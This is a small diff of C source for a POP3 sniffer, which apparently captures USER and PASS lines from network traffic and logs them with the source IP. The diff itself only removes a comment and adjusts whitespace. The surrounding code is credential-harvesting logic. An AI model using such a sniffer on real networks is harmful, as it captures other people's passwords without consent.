@@ -15,7 +15,6 @@ typedef struct {
     int pass_found;
 } pop3_state_t;
 
-// Global state (in a real implementation, you'd want per-connection state)
 static pop3_state_t pop3_state = {0};
 
 // Helper function to trim whitespace and newlines
@@ -161,7 +160,7 @@ void pop3_sniffer_process(const uint8_t *data, size_t len, const char *ip_origen
         
         line_start = line_end + 1;
     }
-    
+
     // If we have both user and password, log them
     if (pop3_state.user_found && pop3_state.pass_found) {
         log_credentials(pop3_state.user, pop3_state.pass, ip_origen);
@@ -172,7 +171,7 @@ void pop3_sniffer_process(const uint8_t *data, size_t len, const char *ip_origen
         memset(pop3_state.user, 0, sizeof(pop3_state.user));
         memset(pop3_state.pass, 0, sizeof(pop3_state.pass));
     }
-    
+
     // Move remaining data to beginning of buffer
     if (line_start < pop3_state.buffer + pop3_state.buffer_len) {
         size_t remaining = pop3_state.buffer + pop3_state.buffer_len - line_start;
